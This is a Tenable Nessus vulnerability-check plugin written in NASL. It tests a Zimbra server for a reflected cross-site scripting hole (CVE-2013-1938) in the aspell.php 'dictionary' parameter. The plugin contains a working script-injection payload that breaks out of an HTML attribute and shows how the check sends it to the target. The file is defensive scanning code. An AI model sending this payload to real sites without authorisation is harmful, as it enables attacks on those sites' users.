#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(72670);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/01/16 03:36:09 $");

  script_cve_id("CVE-2013-1938");
  script_bugtraq_id(58913);
  script_osvdb_id(92051);

  script_name(english:"Zimbra Collaboration Server aspell.php dictionary Parameter XSS");
  script_summary(english:"Attempts a non-persistent XSS");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script that is affected by a cross-
site scripting vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:

"The version of the Zimbra Collaboration Server spell check service
installed on the remote host is affected by a cross-site scripting (XSS)
vulnerability because it fails to properly sanitize user-supplied input
to the 'dictionary' parameter of the 'aspell.php' script.  An attacker
may be able to leverage this to inject arbitrary HTML and script code
into a user's browser to be executed within the security context of the
affected site."
  );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/oss-sec/2013/q2/28");
  script_set_attribute(attribute:"see_also", value:"https://bugzilla.zimbra.com/show_bug.cgi?id=81588");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/04/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/02/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zimbra:collaboration_suite");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("zimbra_aspell_detect.nbin");
  script_require_keys("www/zimbra_aspell", "www/PHP");
  script_require_ports("Services/www", 7780);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:7780, php:TRUE);

install = get_install_from_kb(
  appname : "zimbra_aspell",
  port    : port,
  exit_on_fail : TRUE
);
dir = install["dir"];

xss_test = '"><script>alert(' + "'" + SCRIPT_NAME + '-' + unixtime() + "'" + ');' + '</script>';

exploit = test_cgi_xss(
  port     : port,
  dirs     : make_list(dir),
  cgi      : 'aspell.php',
  qs       : 'dictionary=' + urlencode(str:xss_test),
  pass_str : 'value="' + xss_test,
  pass_re  : '\\<title\\>Spell Checker\\</title\\>'
);

if (!exploit)
{
  install_url = build_url(qs: dir + "/aspell.php", port: port);
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "Zimbra Collaboration Server Spell Check Service", install_url);
}
